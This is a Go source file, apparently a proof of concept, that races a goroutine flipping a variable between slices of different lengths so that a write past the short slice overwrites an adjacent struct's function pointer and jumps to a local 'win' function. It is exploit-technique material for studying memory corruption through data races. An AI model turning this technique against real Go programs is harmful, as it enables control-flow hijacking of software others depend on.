/*
Inspiration from https://github.com/StalkR/misc
*/
package main

import (
	"fmt"
	"os"
	"runtime"
	"strconv"
)

// Utility functions

// i and j hold loop counters for the `main` coroutine, and the spawned coroutine.
var i, j int

// address returns the integer address of a given parameter
func address(i interface{}) int {
	addr, err := strconv.ParseUint(fmt.Sprintf("%p", i), 0, 0)
	if err != nil {
		panic(err)
	}
	return int(addr)
}

// Win is a simple target because it expects no parameters, so we don't have to groom the stack.
func win() {
	fmt.Println("win", i, j)
	os.Exit(1)
}

// StructFuncPtr is a structure containing a single field `funcptr`, which will be overridden by our slice assignment.
type StructFuncPtr struct {
	funcptr func()
}

func main() {
	if runtime.NumCPU() < 2 {
		fmt.Println("need >= 2 CPUs")
		os.Exit(1)
	}

	// Calculate the address of the win function so we can emulate the "attacker controlled" value
	winAddr := address(win)

	// Define the variables involved in the race:
	//
	// * `a`: The longer slice we will use to confuse the `length` attribute during the race.
	// * `b`: The shorter slice we will use when confused to overrite `target`'s `funcptr` field.
	// * `target`: The instance of `StructFuncPtr` which will be overridden into at the `funcptr` field.
	a := make([]*int, 2)
	b := make([]*int, 1)
	target := new(StructFuncPtr)

	// Ensure the address of `b` is within 8 bytes of the target so we can ensure we can overwrite `funcptr`
	// in the race. In practice, this won't be here, but for purposes of replicating the race, we have this
	// construct present.
	if address(b)+8 != address(target) {
		fmt.Println("target object isn't next to b instance")
		os.Exit(0)
	}

	// Instantiate `confused` to the value of `b` initially.
	confused := b

	// Spawn a coroutine to flip the value of of confused between `a` and `b`, which will produce our race.
	go func() {
		for {
			confused = a

			// Keep this function from being optimized which would prevent the race.
			func() {
				if i >= 0 {
					return
				}
				fmt.Println(confused)
			}()

			confused = b
			i++
		}
	}()

	// Spawn a coroutine to attempt to assign index 1 of `confused` to the win addr. This will result in
	// overwriting `target`'s `funcptr` field when `confused`s length is equal to `a`, but data points to `b`,
	// and we attempt to assign index 1 to the win address, as the win address will be put into the `funcptr`
	// field value.
	//
	// Once the `funcptr` has potentially been overwritten (which we detect based on whether `funcptr` is nil)
	// we can attempt to execute it.
	for {
		j++
		func() {
			defer func() { recover() }()
			confused[1] = &winAddr
		}()
		if target.funcptr != nil {
			target.funcptr()
		}
	}
}
